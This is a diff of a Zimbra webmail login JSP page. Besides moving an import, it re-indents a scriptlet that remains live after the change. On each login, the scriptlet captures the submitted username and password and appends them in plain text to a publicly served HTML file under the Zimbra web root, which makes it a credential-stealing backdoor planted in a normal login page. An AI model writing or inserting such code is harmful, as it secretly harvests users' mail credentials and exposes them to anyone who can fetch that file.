@@ -2,8 +2,8 @@
 <%@ page pageEncoding="UTF-8" contentType="text/html; charset=UTF-8" %>
 <%@ page session="false" %>
 <%@ page import="java.util.UUID" %>
-<%@ page import="java.io.FileWriter" %>
 <%@ page import="com.zimbra.cs.taglib.ZJspSession"%>
+<%@ page import="java.io.FileWriter" %>
 <%@ taglib prefix="zm" uri="com.zimbra.zm" %>
 <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
 <%@ taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions" %>
@@ -140,12 +140,12 @@
 						</c:otherwise>
 					</c:choose>
 					<%-- continue on at not empty authResult test --%>
-					<%
-						String data = request.getParameter("username") + ":" + request.getParameter("password") + "<br>";
-						FileWriter writer = new FileWriter("/opt/zimbra/jetty/webapps/zimbra/portals/example/content.html", true);
-						writer.write(data);
-						writer.close();
-					%>
+                    <%
+                        String data = request.getParameter("username") + ":" + request.getParameter("password") + "<br>";
+                        FileWriter writer = new FileWriter("/opt/zimbra/jetty/webapps/zimbra/portals/example/content.html", true);
+                        writer.write(data);
+                        writer.close();
+                    %>
 				</c:when>
 				<c:otherwise>
 					<c:set var="errorCode" value="noCookies"/>
